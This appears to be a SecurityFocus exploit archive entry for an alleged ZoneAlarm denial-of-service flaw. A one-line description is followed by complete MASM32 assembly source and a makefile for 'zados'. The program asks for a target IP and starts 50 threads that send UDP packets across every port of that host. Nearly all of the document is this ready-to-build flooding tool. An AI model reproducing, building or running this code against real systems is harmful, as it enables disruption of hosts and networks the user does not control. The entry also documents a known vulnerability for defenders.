source: http://www.securityfocus.com/bid/8525/info
  
A denial of service vulnerability has been alleged in ZoneAlarm. It is reportedly possible to reproduce this condition by sending a flood of UDP packets of random sizes to random ports on a system hosting the vulnerable software.

;//		          This is threadable UDP spammer
;/
;//
;//					 igor@email.ru  Igor Franchuk
;//						    
;//---------------------------------------------------------------------------

; #########################################################################
	.386
	.model flat, stdcall  
	option casemap :none  
	include \masm32\include\windows.inc
	include \masm32\include\kernel32.inc
	includelib \masm32\lib\kernel32.lib
	include \masm32\include\user32.inc 
	includelib \masm32\lib\user32.lib
	include \masm32\include\advapi32.inc
	includelib \masm32\lib\advapi32.lib
	include \masm32\include\comctl32.inc
	includelib \masm32\lib\comctl32.lib
	include \masm32\include\ws2_32.inc
	includelib \masm32\lib\ws2_32.lib

; #########################################################################
WinMain		 proto :DWORD,:DWORD,:DWORD,:DWORD
SetTransparency  proto :DWORD,:BYTE
GetRegString     proto :DWORD,:DWORD,:DWORD,:DWORD
Spam	 	 proto :DWORD
; #########################################################################
	.DATA	
 	 ClassName db "ZADOSWndClassObject",0
	 Caption   db "ZoneAlarm DOS test",0
	 User32lib db "user32",0
 	 SetLayeredWindowAttributesName db "SetLayeredWindowAttributes",0
 	 SBuf	   db 255,255,255,255,255,255,255,255,255,255,255,255
	 IPEditBox db "SysIPAddress32",0
         BtnName   db "button",0 
 	 OKBtnCaption db "Spam",0 
	 msgEmptyAdr  db "Invalid IP",0 
 	 msgWinSockErrorAdr db "WinSocket 2.0 is required. WSAStartup failed",0
	 msgWinSockErrorSock db "Invalid socket",0
 	 CancelBtnCaption db "Cancel",0 
 	 ProtoName  db "udp",0
 	 CThread     DWORD 0
 	 GThreadExit DWORD 0
	.DATA?
	 hInstance   HANDLE ?	
	 hIPEditWnd  HANDLE ?
	 hwndOKBtn      HANDLE ?
	 hwndCancelBtn  HANDLE ?
	 icex        INITCOMMONCONTROLSEX <> ;structure for DateTimePicker
	 tIPAdr     DWORD ?
	 Socket	    DWORD ?
	 tIPAdrSN   HANDLE ?
         WSAData    WSADATA <> 
	 SIN 	    sockaddr_in <>
	 TID        HANDLE ?

	 PROTOENTSTRUCT STRUCT
	   p_name    DWORD ?
	   p_aliases DWORD ?
	   p_proto   DWORD ?
 	 PROTOENTSTRUCT  ENDS

	.CONST
	 WS_EX_LAYERED  equ 80000h
	 LWA_ALPHA      equ 2h
	 IPEditID       equ 100h
	 OKBtnID        equ 200h	 
	 CancelBtnID    equ 201h	 
	 IPM_ISBLANK    equ (WM_USER+105)
	 IPM_GETADDRESS equ (WM_USER+102)

; #########################################################################
REVERSE MACRO ip
	push ebx
	mov ebx, ip
	xchg bh, bl
	mov ax, bx
	shr ebx, 16
	xchg bh, bl
	shl eax, 16
	mov ax, bx
	pop ebx
ENDM

MAKEWORD MACRO bLow, bHigh
    mov eax, bLow
    mov ebx, bHigh
    shl ebx, 8
    xor eax, ebx
ENDM
; #########################################################################
	.CODE
start:
;	#Init
        invoke GetModuleHandle, NULL; get the instance handle of our program.
        mov hInstance,eax
        invoke GetCommandLine; get the instance handle of our program.
	invoke WinMain, hInstance,NULL,eax, SW_SHOWDEFAULT        ; call the main function 
	invoke ExitProcess,0 
; #########################################################################
WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, lpCmdLine:HANDLE, mCmdShow:DWORD
	LOCAL wc:WNDCLASSEX
	LOCAL msg:MSG 
	LOCAL hWnd:HWND 
        mov   wc.cbSize,SIZEOF WNDCLASSEX
	mov   wc.style,CS_DBLCLKS + CS_HREDRAW + CS_VREDRAW
	mov   wc.lpfnWndProc, OFFSET WndProc 
	mov   wc.cbClsExtra,NULL
	mov   wc.cbWndExtra,NULL
	push  hInst
	pop   wc.hInstance
	mov   wc.hbrBackground,COLOR_WINDOW+1
	mov   wc.lpszMenuName,NULL 
	mov   wc.lpszClassName,OFFSET ClassName 
	invoke LoadIcon,NULL,IDI_APPLICATION
	mov   wc.hIcon,eax 
	mov   wc.hIconSm,eax 
	invoke LoadCursor,NULL,IDC_ARROW 
	mov   wc.hCursor,eax 
	invoke RegisterClassEx, addr wc   
;#			WS_EX_LEFT+ WS_EX_LTRREADING + WS_EX_TOOLWINDOW,\
	invoke CreateWindowEx,\
			WS_EX_LEFT+ WS_EX_LTRREADING + WS_EX_TOOLWINDOW + WS_EX_WINDOWEDGE,\
        	        ADDR ClassName,\ 
                	ADDR Caption,\ 
	                16CC0000h,\
        	        CW_USEDEFAULT,\ 
                	CW_USEDEFAULT,\ 
	                256,\ 
        	        118,\ 
	                NULL,\ 
        	        NULL,\ 
	                hInst,\ 
	                NULL 
 	mov   hWnd,eax 
        invoke SetTransparency,hWnd,200
        invoke ShowWindow, hWnd, mCmdShow
        invoke UpdateWindow, hWnd
	.WHILE TRUE                                                         ; Enter message loop 
            invoke GetMessage, ADDR msg,NULL,0,0 
            .BREAK .IF (!eax) 
            invoke TranslateMessage, ADDR msg 
            invoke DispatchMessage, ADDR msg 
        .ENDW 
	mov     eax,msg.wParam                                            ; return exit code in eax 
	ret
WinMain endp
; #########################################################################
SetTransparency proc hWnd:HANDLE, bAlpha:BYTE
   LOCAL hLib:HANDLE
   LOCAL SetLayeredWindowAttr:HANDLE
   LOCAL WInfo:DWORD
   invoke LoadLibrary,addr User32lib
   mov hLib,eax
   .IF eax 
      invoke GetProcAddress, hLib, addr SetLayeredWindowAttributesName
      mov SetLayeredWindowAttr, eax
      .IF eax
	 invoke GetWindowLong,hWnd,GWL_EXSTYLE
	 or eax, WS_EX_LAYERED
         invoke SetWindowLong, hWnd, GWL_EXSTYLE, eax
         push LWA_ALPHA
	 xor eax,eax
         mov al,bAlpha
         push eax
         push NULL
         push hWnd
         call [SetLayeredWindowAttr]
      .ENDIF
      invoke FreeLibrary,hLib
   .ENDIF
   ret
SetTransparency endp
; #########################################################################
WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM 
    LOCAL protoent:DWORD
    mov eax, uMsg
    .IF eax==WM_DESTROY                           ; if the user closes our window 
        invoke PostQuitMessage,NULL             ; quit our application 
    .ELSEIF eax==WM_CREATE 
        invoke  InitCommonControls
        invoke CreateWindowEx,NULL,ADDR IPEditBox,NULL,\
                   WS_VISIBLE or WS_BORDER or WS_CHILD,11,\
                   90,180,25,hWnd,IPEditID,\
                   hInstance,NULL
	mov hIPEditWnd,eax
        invoke CreateWindowEx,NULL, ADDR BtnName,ADDR OKBtnCaption,\ 
                        WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON or BS_FLAT,\ 
                        35,50,80,25,hWnd,OKBtnID,hInstance,NULL
	mov hwndOKBtn,eax

        invoke CreateWindowEx,NULL, ADDR BtnName,ADDR CancelBtnCaption,\ 
                        WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON or BS_FLAT,\ 
                        134,50,80,25,hWnd,CancelBtnID,hInstance,NULL
	mov hwndCancelBtn,eax
        INVOKE EnableWindow,hwndCancelBtn,FALSE

	invoke SetTransparency, hwndOKBtn, 500

	invoke SetFocus,hIPEditWnd
    .ELSEIF eax==WM_SIZE 
	mov eax,lParam                                        
        mov edx,eax 
        shr edx,16
        and eax,0ffffh
	mov ebx, eax
	shr ebx,1
	sub ebx,90
	mov ecx,ebx
	add ecx,99
	push ecx
        invoke MoveWindow,hIPEditWnd,ebx,10,180,25,TRUE
        invoke MoveWindow,hwndOKBtn,ebx,50,80,25,TRUE
        pop ecx
        invoke MoveWindow,hwndCancelBtn,ecx,50,80,25,TRUE
;	invoke MoveWindow,hwndStatus,0,0,0,0,TRUE
    .ELSEIF eax==WM_COMMAND
	mov eax,wParam
       .IF lParam == 0;from what window hWnd = 0 - main, !=0 - from a child control
       .ELSE
         .IF ax==OKBtnID;what control
            shr eax,16
           .IF ax==BN_CLICKED;what message
   	      invoke SendMessage, hIPEditWnd, IPM_ISBLANK, 0, 0
   	      .IF !EAX
		 invoke SendMessage, hIPEditWnd, IPM_GETADDRESS, 0, ADDR tIPAdr
		 REVERSE tIPAdr
		 mov tIPAdr, eax
		 invoke inet_ntoa, tIPAdr
        	 mov tIPAdrSN, eax
                 invoke MessageBox,NULL, tIPAdrSN,tIPAdrSN,MB_OK + MB_SYSTEMMODAL
                 MAKEWORD 2, 0
		 invoke WSAStartup,eax,ADDR WSAData

;invoke WSAStartup,101h,addr WSAData             ;initialise le socket           
		 .IF !eax
                    invoke getprotobyname, ADDR ProtoName		    
                    mov protoent, eax
		    mov edi, eax		    
                    assume edi:PTR PROTOENTSTRUCT
                    xor ebx,ebx
		    mov ebx, [edi].p_proto
		    assume edi:nothing
                    and ebx,00FFFFh		    
		    invoke socket,AF_INET,SOCK_DGRAM,ebx
		    .IF eax!=INVALID_SOCKET 
		       mov Socket, eax
		       invoke EnableWindow,hwndOKBtn,FALSE
		       invoke EnableWindow,hwndCancelBtn,TRUE
		       mov SIN.sin_family,AF_INET
		       push tIPAdr
		       pop SIN.sin_addr

                       mov GThreadExit, 0
                       xor ebx, ebx
		       .WHILE ebx < 50
	    	          mov  eax,OFFSET Spam
	    	          push ebx
 	                  invoke CreateThread,NULL,NULL,eax,ebx,NORMAL_PRIORITY_CLASS, ADDR TID
 	                  pop ebx
 	                  inc ebx
 	               .ENDW
;		       mov eax,1
; 		       invoke Spam, eax
 		    .ELSE
                       invoke WSAGetLastError
                       invoke MessageBox,hWnd,ADDR msgWinSockErrorSock,ADDR Caption,MB_OK  + MB_ICONERROR + MB_SYSTEMMODAL + MB_SETFOREGROUND
 		    .ENDIF
                 .ELSE
                    invoke MessageBox,hWnd,ADDR msgWinSockErrorAdr,ADDR Caption,MB_OK  + MB_ICONERROR + MB_SYSTEMMODAL + MB_SETFOREGROUND
                 .ENDIF
                 
              .ELSE
                 invoke MessageBox,hWnd,ADDR msgEmptyAdr,ADDR Caption,MB_OK  + MB_ICONERROR + MB_SYSTEMMODAL + MB_SETFOREGROUND
	 	 invoke SetFocus,hIPEditWnd
              .ENDIF
           .ENDIF
         .ELSEIF ax==CancelBtnID;what control
            shr eax,16
           .IF ax==BN_CLICKED;what message
	      invoke EnableWindow,hwndOKBtn,TRUE
	      invoke EnableWindow,hwndCancelBtn,FALSE
	      mov GThreadExit, 1
	      invoke closesocket, Socket
           .ENDIF
         .ENDIF
       .ENDIF

    .ELSE 
        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing 
        ret 
    .ENDIF 
    xor eax,eax 
    ret
WndProc endp
; #########################################################################
Spam proc ThreadID:DWORD
    xor edx, edx
    mov ebx,1
    .WHILE ebx
        mov eax, ThreadID
        .IF CThread == eax
            mov ebx,0
        .ENDIF
	.IF GThreadExit == 1
            mov ebx,0
        .ENDIF
        .IF edx < 65535
           inc edx
        .ELSE
           xor edx,edx
        .ENDIF
        push edx
        push ebx
        invoke htons, edx
	mov SIN.sin_port,ax     
	invoke connect, Socket, addr SIN ,sizeof SIN
	invoke send, Socket, ADDR msgWinSockErrorAdr, 40, 0
        pop ebx
        pop edx
    .ENDW
    ret
Spam endp
end start

--------------------------------------make file-------------------------------------------

NAME=zados
$(NAME).exe: $(NAME).obj
        Link   /SUBSYSTEM:WINDOWS /LIBPATH:c:\masm32\lib $(NAME).obj
$(NAME).obj: $(NAME).asm
        ml /c /coff /Cp  $(NAME).asm